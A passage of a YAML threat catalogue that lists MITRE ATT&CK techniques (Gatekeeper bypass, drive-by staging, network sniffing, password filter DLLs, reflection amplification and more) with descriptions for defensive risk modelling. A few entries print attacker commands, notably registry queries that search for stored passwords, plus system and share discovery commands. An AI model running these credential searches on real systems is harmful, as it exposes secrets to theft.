      \ when files are downloaded an extended attribute (xattr) called `com.apple.quarantine`\
      \ (also known as a quarantine flag) can be set on the file by the application\
      \ performing the download. Launch Services opens the application in a suspended\
      \ state. For first run applications with the quarantine flag set, Gatekeeper\
      \ executes the following functions:\n\n1. Checks extended attribute \u2013 Gatekeeper\
      \ checks for the quarantine flag, then provides an alert prompt to the user\
      \ to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS\
      \ Common Tools and Techniques)\n\n2. Checks System Policies - Gatekeeper checks\
      \ the system security policy, allowing execution of apps downloaded from either\
      \ just the App Store or the App Store and identified developers.\n\n3. Code\
      \ Signing \u2013 Gatekeeper checks for a valid code signature from an Apple\
      \ Developer ID.\n\n4. Notarization - Using the `api.apple-cloudkit.com` API,\
      \ Gatekeeper reaches out to Apple servers to verify or pull down the notarization\
      \ ticket and ensure the ticket is not revoked. Users can override notarization,\
      \ which will result in a prompt of executing an \u201Cunauthorized app\u201D\
      \ and the security policy will be modified.\n\nAdversaries can subvert one or\
      \ multiple security controls within Gatekeeper checks through logic errors (e.g.\
      \ [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)),\
      \ unchecked file types, and external libraries. For example, prior to macOS\
      \ 13 Ventura, code signing and notarization checks were only conducted on first\
      \ launch, allowing adversaries to write malicious executables to previously\
      \ opened applications in order to bypass Gatekeeper security checks.(Citation:\
      \ theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation\
      \ Brandon Dalton)\n\nApplications and files loaded onto the system from a USB\
      \ flash drive, optical disk, external hard drive, from a drive shared over the\
      \ local network, or using the curl command may not set the quarantine flag.\
      \ Additionally, it is possible to avoid setting the quarantine flag using [Drive-by\
      \ Compromise](https://attack.mitre.org/techniques/T1189).\nhttps://attack.mitre.org/techniques/T1553/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1608.004
    ref_id: T1608.004
    name: Drive-by Target
    description: 'Adversaries may prepare an operational environment to infect systems
      that visit a website over the normal course of browsing. Endpoint systems may
      be compromised through browsing to adversary controlled sites, as in [Drive-by
      Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user''s
      web browser is typically targeted for exploitation (often not requiring any
      extra user interaction once landing on the site), but adversaries may also set
      up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001).
      Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries
      must stage resources needed to deliver that exploit to users who browse to an
      adversary controlled site. Drive-by content can be staged on adversary controlled
      infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583))
      or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).


      Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007),
      into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher
      2015) This may be done in a number of ways, including:


      * Inserting malicious scripts into web pages or other user controllable web
      content such as forum posts

      * Modifying script files served to websites from publicly writeable cloud storage
      buckets

      * Crafting malicious web advertisements and purchasing ad space on a website
      through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))


      In addition to staging content to exploit a user''s web browser, adversaries
      may also stage scripting content to profile the user''s browser (as in [Gather
      Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure
      it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)


      Websites compromised by an adversary and used to stage a drive-by may be ones
      visited by a specific community, such as government, a particular industry,
      or region, where the goal is to compromise a specific user or set of users based
      on a shared interest. This kind of targeted campaign is referred to a strategic
      web compromise or watering hole attack.


      Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs,
      typosquatting, different top-level domain, etc.) during acquisition of infrastructure
      ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate
      [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).

      https://attack.mitre.org/techniques/T1608/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1007
    ref_id: T1007
    name: System Service Discovery
    description: 'Adversaries may try to gather information about registered local
      system services. Adversaries may obtain information about services using tools
      as well as OS utility commands such as <code>sc query</code>, <code>tasklist
      /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.


      Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007)
      during automated discovery to shape follow-on behaviors, including whether or
      not the adversary fully infects the target and/or attempts specific actions.

      https://attack.mitre.org/techniques/T1007'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1040
    ref_id: T1040
    name: Network Sniffing
    description: 'Adversaries may passively sniff network traffic to capture information
      about an environment, including authentication material passed over the network.
      Network sniffing refers to using the network interface on a system to monitor
      or capture information sent over a wired or wireless connection. An adversary
      may place a network interface into promiscuous mode to passively access data
      in transit over the network, or use span ports to capture a larger amount of
      data.


      Data captured via this technique may include user credentials, especially those
      sent over an insecure, unencrypted protocol. Techniques for name service resolution
      poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001),
      can also be used to capture credentials to websites, proxies, and internal systems
      by redirecting traffic to an adversary.


      Network sniffing may reveal configuration details, such as running services,
      version numbers, and other network characteristics (e.g. IP addresses, hostnames,
      VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008)
      and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities.
      Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      (AiTM) to passively gain additional knowledge about the environment.


      In cloud-based environments, adversaries may still be able to use traffic mirroring
      services to sniff network traffic from virtual machines. For example, AWS Traffic
      Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified
      instances to collect traffic from and specified targets to send collected traffic
      to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation:
      Azure Virtual Network TAP) Often, much of this traffic will be in cleartext
      due to the use of TLS termination at the load balancer level to reduce the strain
      of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC
      Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary
      can then use exfiltration techniques such as Transfer Data to Cloud Account
      in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC
      Traffic Mirroring)


      On network devices, adversaries may perform network captures using [Network
      Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as
      `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)

      https://attack.mitre.org/techniques/T1040'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553.002
    ref_id: T1553.002
    name: Code Signing
    description: 'Adversaries may create, acquire, or steal code signing materials
      to sign their malware or tools. Code signing provides a level of authenticity
      on a binary from the developer and a guarantee that the binary has not been
      tampered with. (Citation: Wikipedia Code Signing) The certificates used during
      an operation may be created, acquired, or stolen by the adversary. (Citation:
      Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike
      [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this
      activity will result in a valid signature.


      Code signing to verify software on first run can be used on modern Windows and
      macOS systems. It is not used on Linux due to the decentralized nature of the
      platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)


      Code signing certificates may be used to bypass security policies that require
      signed code to execute on a system.

      https://attack.mitre.org/techniques/T1553/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1530
    ref_id: T1530
    name: Data from Cloud Storage
    description: "Adversaries may access data from cloud storage.\n\nMany IaaS providers\
      \ offer solutions for online data object storage such as Amazon S3, Azure Storage,\
      \ and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office\
      \ 365 and Google Workspace provide cloud-based document storage to users through\
      \ services such as OneDrive and Google Drive, while SaaS application providers\
      \ such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage\
      \ solutions as a peripheral or primary use case of their platform. \n\nIn some\
      \ cases, as with IaaS-based cloud storage, there exists no overarching application\
      \ (such as SQL or Elasticsearch) with which to interact with the stored objects:\
      \ instead, data from these solutions is retrieved directly though the [Cloud\
      \ API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications,\
      \ adversaries may be able to collect this data directly from APIs or backend\
      \ cloud storage objects, rather than through their front-end application or\
      \ interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)).\
      \ \n\nAdversaries may collect sensitive data from these cloud storage solutions.\
      \ Providers typically offer security guides to help end users configure systems,\
      \ though misconfigurations are a common problem.(Citation: Amazon S3 Security,\
      \ 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud\
      \ Storage Best Practices, 2019) There have been numerous incidents where cloud\
      \ storage has been improperly secured, typically by unintentionally allowing\
      \ public access to unauthenticated users, overly-broad access by all users,\
      \ or even access for any anonymous person outside the control of the Identity\
      \ Access Management system without even needing basic user permissions.\n\n\
      This open access may expose various types of sensitive data, such as credit\
      \ cards, personally identifiable information, or medical records.(Citation:\
      \ Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation:\
      \ HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\n\
      Adversaries may also obtain then abuse leaked credentials from source repositories,\
      \ logs, or other means as a way to gain access to cloud storage objects.\nhttps://attack.mitre.org/techniques/T1530"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1565.003
    ref_id: T1565.003
    name: Runtime Data Manipulation
    description: 'Adversaries may modify systems in order to manipulate the data as
      it is accessed and displayed to an end user, thus threatening the integrity
      of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018)
      By manipulating runtime data, adversaries may attempt to affect a business process,
      organizational understanding, and decision making.


      Adversaries may alter application binaries used to display data in order to
      cause runtime manipulations. Adversaries may also conduct [Change Default File
      Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036)
      to cause a similar effect. The type of modification and the impact it will have
      depends on the target application and process as well as the goals and objectives
      of the adversary. For complex systems, an adversary would likely need special
      expertise and possibly access to specialized software related to the system
      that would typically be gained through a prolonged information gathering campaign
      in order to have the desired impact.

      https://attack.mitre.org/techniques/T1565/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.002
    ref_id: T1552.002
    name: Credentials in Registry
    description: 'Adversaries may search the Registry on compromised systems for insecurely
      stored credentials. The Windows Registry stores configuration information that
      can be used by the system or other programs. Adversaries may query the Registry
      looking for credentials and passwords that have been stored for use by other
      programs or services. Sometimes these credentials are used for automatic logons.


      Example commands to find Registry keys related to password information: (Citation:
      Pentestlab Stored Credentials)


      * Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>

      * Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>

      https://attack.mitre.org/techniques/T1552/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1135
    ref_id: T1135
    name: Network Share Discovery
    description: "Adversaries may look for folders and drives shared on remote systems\
      \ as a means of identifying sources of information to gather as a precursor\
      \ for Collection and to identify potential systems of interest for Lateral Movement.\
      \ Networks often contain shared network drives and folders that enable users\
      \ to access file directories on various systems across a network. \n\nFile sharing\
      \ over a Windows network occurs over the SMB protocol. (Citation: Wikipedia\
      \ Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039)\
      \ can be used to query a remote system for available shared drives using the\
      \ <code>net view \\\\\\\\remotesystem</code> command. It can also be used to\
      \ query shared drives on the local system using <code>net share</code>. For\
      \ macOS, the <code>sharing -l</code> command lists all shared points used for\
      \ smb services.\nhttps://attack.mitre.org/techniques/T1135"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1120
    ref_id: T1120
    name: Peripheral Device Discovery
    description: 'Adversaries may attempt to gather information about attached peripheral
      devices and components connected to a computer system.(Citation: Peripheral
      Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could
      include auxiliary resources that support a variety of functionalities such as
      keyboards, printers, cameras, smart card readers, or removable storage. The
      information may be used to enhance their awareness of the system and network
      environment or may be used for further actions.

      https://attack.mitre.org/techniques/T1120'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.009
    ref_id: T1036.009
    name: Break Process Trees
    description: "An adversary may attempt to evade process tree-based analysis by\
      \ modifying executed malware's parent process ID (PPID). If endpoint protection\
      \ software leverages the \u201Cparent-child\" relationship for detection, breaking\
      \ this relationship could result in the adversary\u2019s behavior not being\
      \ associated with previous process tree activity. On Unix-based systems breaking\
      \ this process tree is common practice for administrators to execute software\
      \ using scripts and programs.(Citation: 3OHA double-fork 2022) \n\nOn Linux\
      \ systems, adversaries may execute a series of [Native API](https://attack.mitre.org/techniques/T1106)\
      \ calls to alter malware's process tree. For example, adversaries can execute\
      \ their payload without any arguments, call the `fork()` API call twice, then\
      \ have the parent process exit. This creates a grandchild process with no parent\
      \ process that is immediately adopted by the `init` system process (PID 1),\
      \ which successfully disconnects the execution of the adversary's payload from\
      \ its previous process tree.\n\nAnother example is using the \u201Cdaemon\u201D\
      \ syscall to detach from the current parent process and run in the background.(Citation:\
      \ Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022)\nhttps://attack.mitre.org/techniques/T1036/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.004
    ref_id: T1590.004
    name: Network Topology
    description: 'Adversaries may gather information about the victim''s network topology
      that can be used during targeting. Information about network topologies may
      include a variety of details, including the physical and/or logical arrangement
      of both external-facing and internal network environments. This information
      may also include specifics regarding network devices (gateways, routers, etc.)
      and other infrastructure.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about network topologies may also be exposed to adversaries via online or other
      accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:
      DNS Dumpster) Gathering this information may reveal opportunities for other
      forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1590/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1587.002
    ref_id: T1587.002
    name: Code Signing Certificates
    description: 'Adversaries may create self-signed code signing certificates that
      can be used during targeting. Code signing is the process of digitally signing
      executables and scripts to confirm the software author and guarantee that the
      code has not been altered or corrupted. Code signing provides a level of authenticity
      for a program from the developer and a guarantee that the program has not been
      tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools
      may trust a signed piece of code more than an unsigned piece of code even if
      they don''t know who issued the certificate or who the author is.


      Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries
      may develop self-signed code signing certificates for use in operations.

      https://attack.mitre.org/techniques/T1587/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1222.001
    ref_id: T1222.001
    name: Windows File and Directory Permissions Modification
    description: 'Adversaries may modify file or directory permissions/attributes
      to evade access control lists (ACLs) and access protected files.(Citation: Hybrid
      Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File
      and directory permissions are commonly managed by ACLs configured by the file
      or directory owner, or users with the appropriate permissions. File and directory
      ACL implementations vary by platform, but generally explicitly designate which
      users or groups can perform which actions (read, write, execute, etc.).


      Windows implements file and directory ACLs as Discretionary Access Control Lists
      (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs
      identifies the accounts that are allowed or denied access to a securable object.
      When an attempt is made to access a securable object, the system checks the
      access control entries in the DACL in order. If a matching entry is found, access
      to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access
      Control Lists May 2018)


      Adversaries can interact with the DACLs using built-in Windows commands, such
      as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher
      permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001)
      provides cmdlets that can be used to retrieve or modify file and directory DACLs.
      Specific file and directory modifications may be a required step for many techniques,
      such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008),
      [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037),
      or tainting/hijacking other instrumental binary/configuration files via [Hijack
      Execution Flow](https://attack.mitre.org/techniques/T1574).

      https://attack.mitre.org/techniques/T1222/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137.006
    ref_id: T1137.006
    name: Add-ins
    description: 'Adversaries may abuse Microsoft Office add-ins to obtain persistence
      on a compromised system. Office add-ins can be used to add functionality to
      Office programs. (Citation: Microsoft Office Add-ins) There are different types
      of add-ins that can be used by the various Office products; including Word/Excel
      add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM)
      add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office
      (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation:
      FireEye Mail CDS 2018)


      Add-ins can be used to obtain persistence because they can be set to execute
      code when an Office application starts.

      https://attack.mitre.org/techniques/T1137/006'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505.002
    ref_id: T1505.002
    name: Transport Agent
    description: "Adversaries may abuse Microsoft transport agents to establish persistent\
      \ access to systems. Microsoft Exchange transport agents can operate on email\
      \ messages passing through the transport pipeline to perform various tasks such\
      \ as filtering spam, filtering malicious attachments, journaling, or adding\
      \ a corporate signature to the end of all outgoing emails.(Citation: Microsoft\
      \ TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents\
      \ can be written by application developers and then compiled to .NET assemblies\
      \ that are subsequently registered with the Exchange server. Transport agents\
      \ will be invoked during a specified stage of email processing and carry out\
      \ developer defined tasks. \n\nAdversaries may register a malicious transport\
      \ agent to provide a persistence mechanism in Exchange Server that can be triggered\
      \ by adversary-specified email events.(Citation: ESET LightNeuron May 2019)\
      \ Though a malicious transport agent may be invoked for all emails passing through\
      \ the Exchange transport pipeline, the agent can be configured to only carry\
      \ out specific tasks in response to adversary defined criteria. For example,\
      \ the transport agent may only carry out an action like copying in-transit attachments\
      \ and saving them for later exfiltration if the recipient email address matches\
      \ an entry on a list provided by the adversary.\nhttps://attack.mitre.org/techniques/T1505/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1082
    ref_id: T1082
    name: System Information Discovery
    description: 'An adversary may attempt to get detailed information about the operating
      system and hardware, including version, patches, hotfixes, service packs, and
      architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082)
      during automated discovery to shape follow-on behaviors, including whether or
      not the adversary fully infects the target and/or attempts specific actions.


      Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used
      to gather detailed system information. If running with privileged access, a
      breakdown of system data can be gathered through the <code>systemsetup</code>
      configuration tool on macOS. As an example, adversaries with user-level access
      can execute the <code>df -aH</code> command to obtain currently mounted disks
      and associated freely available space. Adversaries may also leverage a [Network
      Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices
      to gather detailed system information (e.g. <code>show version</code>).(Citation:
      US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082)
      combined with information gathered from other forms of discovery and reconnaissance
      can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation:
      20 macOS Common Tools and Techniques)


      Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure
      allow access to instance and virtual machine information via APIs. Successful
      authenticated API calls can return data such as the operating system platform
      and status of a particular instance or the model view of a virtual machine.(Citation:
      Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft
      Virutal Machine API)

      https://attack.mitre.org/techniques/T1082'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071
    ref_id: T1071
    name: Application Layer Protocol
    description: "Adversaries may communicate using OSI application layer protocols\
      \ to avoid detection/network filtering by blending in with existing traffic.\
      \ Commands to the remote system, and often the results of those commands, will\
      \ be embedded within the protocol traffic between the client and server. \n\n\
      Adversaries may utilize many different protocols, including those used for web\
      \ browsing, transferring files, electronic mail, DNS, or publishing/subscribing.\
      \ For connections that occur internally within an enclave (such as those between\
      \ a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH,\
      \ or RDP.(Citation: Mandiant APT29 Eye Spy Email Nov 22)\nhttps://attack.mitre.org/techniques/T1071"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.014
    ref_id: T1574.014
    name: AppDomainManager
    description: "Adversaries may execute their own malicious payloads by hijacking\
      \ how the .NET `AppDomainManager` loads assemblies. The .NET framework uses\
      \ the `AppDomainManager` class to create and manage one or more isolated runtime\
      \ environments (called application domains) inside a process to host the execution\
      \ of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run\
      \ as .NET code) may be loaded into an application domain as executable code.(Citation:\
      \ Microsoft App Domains) \n\nKnown as \"AppDomainManager injection,\" adversaries\
      \ may execute arbitrary code by hijacking how .NET applications load assemblies.\
      \ For example, malware may create a custom application domain inside a target\
      \ process to load and execute an arbitrary assembly. Alternatively, configuration\
      \ files (`.config`) or process environment variables that define .NET runtime\
      \ settings may be tampered with to instruct otherwise benign .NET applications\
      \ to load a malicious assembly (identified by name) into the target process.(Citation:\
      \ PenTestLabs AppDomainManagerInject)(Citation: PwC Yellow Liderc)(Citation:\
      \ Rapid7 AppDomain Manager Injection)\nhttps://attack.mitre.org/techniques/T1574/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1074.002
    ref_id: T1074.002
    name: Remote Data Staging
    description: 'Adversaries may stage data collected from multiple systems in a
      central location or directory on one system prior to Exfiltration. Data may
      be kept in separate files or combined into one file through techniques such
      as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive
      command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106)
      and bash may be used to copy data into a staging location.


      In cloud environments, adversaries may stage data within a particular instance
      or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002)
      and stage data in that instance.(Citation: Mandiant M-Trends 2020)


      By staging data on one system prior to Exfiltration, adversaries can minimize
      the number of connections made to their C2 server and better evade detection.

      https://attack.mitre.org/techniques/T1074/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.006
    ref_id: T1098.006
    name: Additional Container Cluster Roles
    description: "An adversary may add additional roles or permissions to an adversary-controlled\
      \ user or service account to maintain persistent access to a container orchestration\
      \ system. For example, an adversary with sufficient permissions may create a\
      \ RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes\
      \ account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023)\
      \ Where attribute-based access control (ABAC) is in use, an adversary with sufficient\
      \ permissions may modify a Kubernetes ABAC policy to give the target account\
      \ additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification\
      \ may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136)\
      \ or other malicious account activity. Adversaries may also modify existing\
      \ [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have\
      \ compromised.  \n\nNote that where container orchestration systems are deployed\
      \ in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes\
      \ Service, and Azure Kubernetes Service, cloud-based  role-based access control\
      \ (RBAC) assignments or ABAC policies can often be used in place of or in addition\
      \ to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation:\
      \ AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes\
      \ Service Service Accounts) In these cases, this technique may be used in conjunction\
      \ with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).\n\
      https://attack.mitre.org/techniques/T1098/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053
    ref_id: T1053
    name: Scheduled Task/Job
    description: 'Adversaries may abuse task scheduling functionality to facilitate
      initial or recurring execution of malicious code. Utilities exist within all
      major operating systems to schedule programs or scripts to be executed at a
      specified date and time. A task can also be scheduled on a remote system, provided
      the proper authentication is met (ex: RPC and file and printer sharing in Windows
      environments). Scheduling a task on a remote system typically may require being
      a member of an admin or otherwise privileged group on the remote system.(Citation:
      TechNet Task Scheduler Security)


      Adversaries may use task scheduling to execute programs at system startup or
      on a scheduled basis for persistence. These mechanisms can also be abused to
      run a process under the context of a specified account (such as one with elevated
      permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
      adversaries have also abused task scheduling to potentially mask one-time execution
      under a trusted system process.(Citation: ProofPoint Serpent)

      https://attack.mitre.org/techniques/T1053'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.007
    ref_id: T1218.007
    name: Msiexec
    description: 'Adversaries may abuse msiexec.exe to proxy execution of malicious
      payloads. Msiexec.exe is the command-line utility for the Windows Installer
      and is thus commonly associated with executing installation packages (.msi).(Citation:
      Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.


      Adversaries may abuse msiexec.exe to launch local or network accessible MSI
      files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation:
      TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems,
      msiexec.exe can be used to bypass application control solutions that do not
      account for its potential abuse. Msiexec.exe execution may also be elevated
      to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation:
      Microsoft AlwaysInstallElevated 2018)

      https://attack.mitre.org/techniques/T1218/007'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.003
    ref_id: T1590.003
    name: Network Trust Dependencies
    description: 'Adversaries may gather information about the victim''s network trust
      dependencies that can be used during targeting. Information about network trusts
      may include a variety of details, including second or third-party organizations/domains
      (ex: managed service providers, contractors, etc.) that have connected (and
      potentially elevated) network access.


      Adversaries may gather this information in various ways, such as direct elicitation
      via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about network trusts may also be exposed to adversaries via online or other
      accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation:
      Pentesting AD Forests) Gathering this information may reveal opportunities for
      other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

      https://attack.mitre.org/techniques/T1590/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1498.002
    ref_id: T1498.002
    name: Reflection Amplification
    description: 'Adversaries may attempt to cause a denial of service (DoS) by reflecting
      a high-volume of network traffic to a target. This type of Network DoS takes
      advantage of a third-party server intermediary that hosts and will respond to
      a given spoofed source IP address. This third-party server is commonly termed
      a reflector. An adversary accomplishes a reflection attack by sending packets
      to reflectors with the spoofed address of the victim. Similar to Direct Network
      Floods, more than one system may be used to conduct the attack, or a botnet
      may be used. Likewise, one or more reflectors may be used to focus traffic on
      the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack
      may also reduce the availability and functionality of the targeted system(s)
      and network.


      Reflection attacks often take advantage of protocols with larger responses than
      requests in order to amplify their traffic, commonly known as a Reflection Amplification
      attack. Adversaries may be able to generate an increase in volume of attack
      traffic that is several orders of magnitude greater than the requests sent to
      the amplifiers. The extent of this increase will depending upon many variables,
      such as the protocol in question, the technique used, and the amplifying servers
      that actually produce the amplification in attack volume. Two prominent protocols
      that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare
      DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though
      the use of several others in the wild have been documented.(Citation: Arbor
      AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself
      to be a powerful protocol, with amplification sizes up to 51,200 times the requesting
      packet.(Citation: Cloudflare Memcrashed Feb 2018)

      https://attack.mitre.org/techniques/T1498/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.002
    ref_id: T1556.002
    name: Password Filter DLL
    description: "Adversaries may register malicious password filter dynamic link\
      \ libraries (DLLs) into the authentication process to acquire user credentials\
      \ as they are validated. \n\nWindows password filters are password policy enforcement\
      \ mechanisms for both domain and local accounts. Filters are implemented as\
      \ DLLs containing a method to validate potential passwords against password\
      \ policies. Filter DLLs can be positioned on local computers for local accounts\
      \ and/or domain controllers for domain accounts. Before registering new passwords\
      \ in the Security Accounts Manager (SAM), the Local Security Authority (LSA)\
      \ requests validation from each registered filter. Any potential changes cannot\
      \ take effect until every registered filter acknowledges validation. \n\nAdversaries\
      \ can register malicious password filters to harvest credentials from local\
      \ computers and/or entire domains. To perform proper validation, filters must\
      \ receive plain-text credentials from the LSA. A malicious password filter would\
      \ receive these plain-text credentials every time a password request is made.(Citation:\
      \ Carnal Ownage Password Filters Sept 2013)\nhttps://attack.mitre.org/techniques/T1556/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505.005
    ref_id: T1505.005
    name: Terminal Services DLL
    description: 'Adversaries may abuse components of Terminal Services to enable
      persistent access to systems. Microsoft Terminal Services, renamed to Remote
      Desktop Services in some Windows Server OSs as of 2022, enable remote terminal
      connections to hosts. Terminal Services allows servers to transmit a full, interactive,
      graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop
      Services)


      [Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run
      as a "generic" process (ex: <code>svchost.exe</code>) load the service''s DLL
      file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation:
      Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically
      stored in `%SystemRoot%\System32\`, is the default <code>ServiceDll</code> value
